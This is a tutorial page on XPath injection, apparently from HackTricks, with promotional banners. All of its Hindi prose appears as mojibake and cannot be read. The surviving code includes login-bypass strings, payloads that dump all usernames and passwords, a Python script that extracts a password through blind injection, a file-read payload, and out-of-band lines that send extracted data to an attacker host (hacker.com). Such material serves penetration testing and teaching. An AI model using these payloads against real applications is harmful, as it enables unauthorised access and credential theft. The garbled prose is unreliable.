# XPATH рдЕрдВрджрд░рдШрд╛рдд

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рд╕рдорд╛рдЪрд╛рд░**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреА рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд░рд╣реЗрдВ рдФрд░ рдЕрдВрджрд░реВрдиреА рджреГрд╢реНрдпреЛрдВ рдХреЗ рд╕рд╛рде

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**рдбрд┐рд╕реНрдХреЙрд░реНрдб**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## рдореВрд▓ рд╡рд╛рдХреНрдп-рд░рдЪрдирд╛

XPath рдЕрдВрджрд░рдШрд╛рдд рдирд╛рдордХ рдПрдХ рд╣рдорд▓рд╛ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдкрд░ рдЖрдзрд╛рд░рд┐рдд XPath (XML рдкрде рднрд╛рд╖рд╛) рдХреНрд╡реЗрд░реА рдмрдирд╛рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреНрд╡реЗрд░реА рдпрд╛ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░ рд╕рдХреЗрдВред

### рд╡рд┐рд╡рд░рдгрд┐рдд рдиреЛрдбреНрд╕

рдПрдХреНрд╕рдкреНрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рднрд┐рдиреНрди рдиреЛрдбреНрд╕ рдХрд╛ рдЪрдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдПрдХреНрд╕рдкреНрд░реЗрд╢рдиреНрд╕ рдФрд░ рдЙрдирдХреЗ рд╡рд┐рд╡рд░рдг рдиреАрдЪреЗ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ:

- **рдиреЛрдбрдирд╛рдо**: "рдиреЛрдбрдирд╛рдо" рдирд╛рдо рдХреЗ рд╕рднреА рдиреЛрдбреНрд╕ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **/**: рдЪрдпрди рдореВрд▓ рдиреЛрдб рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **//**: рд╡рд░реНрддрдорд╛рди рдиреЛрдб рд╕реЗ рдореЗрд▓ рдЦрд╛рддреЗ рд╣реБрдП рдЪрдпрди рдХрд┐рдП рдЧрдП рдиреЛрдбреНрд╕ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ рд╡реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдХрд╣реАрдВ рднреА рд╣реЛрдВред
- **.**: рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **..**: рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдХрд╛ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **@**: рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдЪрдпрдирд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

### XPath рдЙрджрд╛рд╣рд░рдг

рдкрде рдПрдХреНрд╕рдкреНрд░реЗрд╢рдиреНрд╕ рдФрд░ рдЙрдирдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╣реИрдВ:

- **bookstore**: "bookstore" рдирд╛рдо рдХреЗ рд╕рднреА рдиреЛрдбреНрд╕ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **/bookstore**: рдореВрд▓ рддрддреНрд╡ bookstore рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдПрдХ рддрддреНрд╡ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдПрдХ рд╕реНрд▓реИрд╢ (/) рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдорд╛рд░реНрдЧ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **bookstore/book**: bookstore рдХреЗ рдмрдЪреНрдЪреЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **//book**: рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрдирдХреЗ рд╕реНрдерд╛рди рдХрд╛ рдХреЛрдИ рдорд╣рддреНрд╡ рдирд╣реАрдВ рд╣реИред
- **bookstore//book**: bookstore рддрддреНрд╡ рдХреЗ рдЕрдзреАрдирд╕реНрде рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ рд╡реЗ bookstore рддрддреНрд╡ рдХреЗ рдиреАрдЪреЗ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рд╣реЛрдВред
- **//@lang**: рд╕рднреА lang рдирд╛рдордХ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдЪрдпрдирд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

### рдкреНрд░реЗрдбрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЪрдпрди рдХреЛ рд╕реБрдзрд╛рд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрдбрд┐рдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

- **/bookstore/book[1]**: bookstore рддрддреНрд╡ рдХреЗ рдкрд╣рд▓реЗ рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдмрдЪреНрдЪрд╛ рдЪрдпрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред IE рд╕рдВрд╕реНрдХрд░рдг 5 рд╕реЗ 9 рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрд╛рдп, рдЬреЛ рдкрд╣рд▓реЗ рдиреЛрдб рдХреЛ [0] рдХреЗ рд░реВрдк рдореЗрдВ рд╕реВрдЪреАрдд рдХрд░рддреЗ рд╣реИрдВ, рд╡рд╣ JavaScript рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XPath рдХреЛ SelectionLanguage рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реИред
- **/bookstore/book[last()]**: bookstore рддрддреНрд╡ рдХреЗ рдЕрдВрддрд┐рдо рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдмрдЪреНрдЪрд╛ рдЪрдпрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **/bookstore/book[last()-1]**: bookstore рддрддреНрд╡ рдХреЗ рджреНрд╡рд┐рддреАрдп рдЕрдВрддрд┐рдо рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдмрдЪреНрдЪрд╛ рдЪрдпрдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **/bookstore/book[position()<3]**: bookstore рддрддреНрд╡ рдХреЗ рдкрд╣рд▓реЗ рджреЛ рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдмрдЪреНрдЪреЗ рдЪрдпрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- **//title[@lang]**: рд╕рднреА lang рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╡рд╛рд▓реЗ рд╢реАрд░реНрд╖рдХ рддрддреНрд╡ рдЪрдпрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- **//title[@lang='en']**: "lang" рд╡рд┐рд╢реЗрд╖рддрд╛ рдорд╛рди "en" рд╡рд╛рд▓реЗ рд╕рднреА рд╢реАрд░реНрд╖рдХ рддрддреНрд╡ рдЪрдпрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- **/bookstore/book[price>35.00]**: 35.00 рд╕реЗ рдЕрдзрд┐рдХ рдореВрд▓реНрдп рд╡рд╛рд▓реА рд╕рднреА bookstore рдХреА рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдЪрдпрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
- **/bookstore/book[price>35.00]/title**: 35.00 рд╕реЗ рдЕрдзрд┐рдХ рдореВрд▓реНрдп рд╡рд╛рд▓реА bookstore рдХреА рдкреБрд╕реНрддрдХ рддрддреНрд╡ рдХреЗ рд╢реАрд░реНрд╖рдХ рддрддреНрд╡ рдЪрдпрдирд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

### рдЕрдЬреНрдЮрд╛рдд рдиреЛрдбреНрд╕ рдХрд╛ рд╕рдВрднрд╛рд▓рди

рдЕрдЬреНрдЮрд╛рдд рдиреЛрдбреНрд╕ рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд▓рд┐рдП рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

- **\***: рдХрд┐рд╕реА рднреА рддрддреНрд╡ рдиреЛрдб рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд▓рд┐рдПред
- **@***: рдХрд┐рд╕реА рднреА рд╡рд┐рд╢реЗрд╖рддрд╛ рдиреЛрдб рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд▓рд┐рдПред
- **node()**: рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрд┐рд╕реА рднреА рдиреЛрдб рдХреЗ рдорд┐рд▓рд╛рди рдХреЗ рд▓рд┐рдПред

рдФрд░ рдЙрджрд╛рд╣рд░рдг рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

- **/bookstore/\***: bookstore рддрддреНрд╡ рдХреЗ рд╕рднреА рдмрдЪреНрдЪреЗ рддрддреНрд╡ рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **//\***: рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╕рднреА рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- **//title[@\*]**: рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдХрдо рд╕реЗ рдХрдо рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓реЗ рд╕рднреА рд╢реАрд░реНрд╖рдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред


## рдЙрджрд╛рд╣рд░рдг
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪреЗрдВ
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### рдкрд╣рдЪрд╛рди рдФрд░ рд╕реНрдХреАрдо рдЪреБрд░рд╛рдирд╛
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕

### **рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрджрд╛рд╣рд░рдг:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ OR рдмрд╛рдпрдкрд╛рд╕ (рджреЛрдиреЛрдВ рдореЗрдВ рд╕рдорд╛рди рдорд╛рди)**
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **рдирд▓ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ**
```
Username: ' or 1]%00
```
### **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдбрдмрд▓ рдпрд╛** (рдХреЗрд╡рд▓ 1 рд╡рдВрд▓рд░реЗрдмрд▓ рдлрд╝реАрд▓реНрдб рдХреЗ рд╕рд╛рде рд╡реИрдз рд╣реИ)

рдорд╣рддреНрд╡рдкреВрд░реНрдг: рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **"рдФрд░" рдкрд╣рд▓рд╛ рдСрдкрд░реЗрд╢рди рд╣реИ рдЬреЛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2┬║ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## рд╕реНрдЯреНрд░рд┐рдВрдЧ рдирд┐рдХрд╛рд▓рдирд╛

рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореВрд▓реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдиреНрд╣реЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
## рдЕрдВрдзрд╛ рд╢реЛрдз

### **рдорд╛рди рдХреА рд▓рдВрдмрд╛рдИ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рддреБрд▓рдирд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЙрд╕реЗ рдирд┐рдХрд╛рд▓реЗрдВ:**
```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```
### **рдкрд╛рдпрдерди рдЙрджрд╛рд╣рд░рдг**
```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
if ("TRUE_COND" in r.text):
l = i
break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
for al in alphabet:
r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
if ("TRUE_COND" in r.text):
flag += al
print("[+] Flag: " + flag)
break
```
### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```
## OOB рд╢реЛрдз
```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреВрд▓

* [xcat](https://xcat.readthedocs.io/)
* [xxxpwn](https://github.com/feakk/xxxpwn)
* [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
* [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [XmlChor](https://github.com/Harshal35/XMLCHOR)

## рд╕рдВрджрд░реНрдн
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
* [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреЗ рд╣реИрдХрд┐рдВрдЧ рд╡рд┐рд╢реНрд╡ рдореЗрдВ рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╕рдорд╛рдЪрд╛рд░ рдФрд░ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

[**Discord**](https://discord.com/invite/N3FrSbmwdy) рдкрд░ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
